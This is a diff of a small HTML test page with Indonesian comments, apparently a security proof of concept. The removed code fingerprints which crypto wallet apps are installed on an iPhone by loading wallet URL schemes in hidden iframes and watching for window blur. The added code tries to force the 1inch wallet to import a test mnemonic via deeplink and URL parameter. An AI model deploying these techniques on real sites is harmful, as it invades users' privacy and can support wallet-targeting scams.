@@ -1,54 +1,18 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="scan()">Scan Wallet Terinstall</button>
-<pre id="o">Belum di-scan...</pre>
+<button onclick="test1()">Test 1 - Import via Deeplink</button><br><br>
+<button onclick="test2()">Test 2 - Import via URL Param</button>
+<pre id="o"></pre>
 <script>
-async function cekScheme(scheme){
-  return new Promise((resolve)=>{
-    let start = performance.now();
-    let done = false;
-    function finish(found){
-      if(done) return;
-      done = true;
-      window.removeEventListener('blur', onBlur);
-      resolve({scheme, found, time: (performance.now()-start).toFixed(1)});
-    }
-    function onBlur(){
-      // Kalo browser ke-blur, berarti ada app yang kebuka = wallet-nya ke-install
-      finish(true);
-    }
-    window.addEventListener('blur', onBlur);
-    let iframe = document.createElement('iframe');
-    iframe.style.display = "none";
-    iframe.src = scheme;
-    document.body.appendChild(iframe);
-    setTimeout(()=>{
-      document.body.removeChild(iframe);
-      finish(false);
-    }, 800);
-  });
+function test1(){
+  document.getElementById('o').innerText = "Coba deeplink import...";
+  // Coba 3 format yang biasa dipake wallet
+  window.location.href = "1inch://import?mnemonic=" + encodeURIComponent("abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about");
 }
-async function scan(){
-  let out = document.getElementById('o');
-  out.innerText = "Scanning... jangan pindah app dulu";
-  let wallets = [
-    "metamask://",
-    "trust://",
-    "1inch://",
-    "phantom://",
-    "rainbow://",
-    "coinbase://"
-  ];
-  let r = "";
-  for(let w of wallets){
-    let res = await cekScheme(w);
-    r += res.scheme + " -> " + (res.found ? "KE-INSTALL (blur)" : "GAK KE-INSTALL / di-block") + " | " + res.time + "ms\n";
-    out.innerText = r;
-    await new Promise(x=>setTimeout(x, 300));
-  }
-  r += "\nKalo ada yang KE-INSTALL, berarti situs ini bisa nebak wallet apa aja yang ada di iPhone lu.";
-  out.innerText = r;
+function test2(){
+  document.getElementById('o').innerText = "Coba URL param...";
+  window.location.href = "https://app.1inch.io/#/1/wallet/import?mnemonic=" + encodeURIComponent("abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about");
 }
 </script>
 </body>
